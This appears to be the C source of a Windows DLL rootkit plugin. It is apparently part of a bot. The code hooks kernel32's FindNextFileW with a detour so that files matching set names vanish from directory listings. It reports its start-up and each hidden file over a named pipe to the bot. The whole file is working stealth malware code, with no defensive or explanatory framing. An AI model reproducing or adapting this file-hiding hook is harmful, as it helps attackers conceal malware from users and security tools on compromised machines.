#include "StdAfx.h"

tFindNextFileW oFindNextFileW;

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
#ifdef _DEBUGLITE
		DbugMsg("Plugin Loaded");
#endif
		Start_Hooks(hModule);		
		break;
	}
    return TRUE;
}
void DbugMsg(char* s, ...)
{
	char t[1024];
	char msg[1024];
	va_list va;
	
	va_start(va, s);
	vsprintf(t, s, va);
	
	sprintf(msg, __FUNCTION__" : %s", t);
	OutputDebugString(msg);
}
void Start_Hooks(HANDLE hModule)
{
	oFindNextFileW = (tFindNextFileW) DetourCreate("kernel32.dll", "FindNextFileW", &hFindNextFileW, DETOUR_TYPE_JMP);

#ifdef _DEBUGLITE
	DbugMsg("Hooks Set");
#endif
	Send_Message("Rootkit Initialized");
	return;
}

void Send_Message(char *szMessage, ...)
{
	HANDLE hFile;
	BOOL flg;
	DWORD dwWrite;
	char t[1024];
	char msg[1024];
	va_list va;
	
	va_start(va, szMessage);
	vsprintf(t, szMessage, va);
	sprintf(msg, __FUNCTION__": %s", t);

	hFile = CreateFile(GBOTPIPE, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);         
	if(hFile == INVALID_HANDLE_VALUE)																	 
	{
		return;
	} else {
		flg = WriteFile(hFile, msg, strlen(msg), &dwWrite, NULL);
		CloseHandle(hFile);
	}

	return;
}

/* - Hooked FindNextFileW */
DWORD WINAPI hFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	char szName[MAX_PATH];
	BOOL ret;
	
	ret = oFindNextFileW(hFindFile, lpFindFileData);
	memset(szName, 0, sizeof(szName));
	WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, -1, szName, sizeof(szName) , NULL, NULL);
	
	if (!strncmp(szName, HIDEFILE, 4) || strstr(szName, HIDEPLUG))
	{
#ifdef _DEBUGLITE
		DbugMsg("Hidden: %s", szName);
#endif
		Send_Message("Hidden: %s", szName);
		ret = oFindNextFileW(hFindFile, lpFindFileData);
	}
	
	return ret;
}
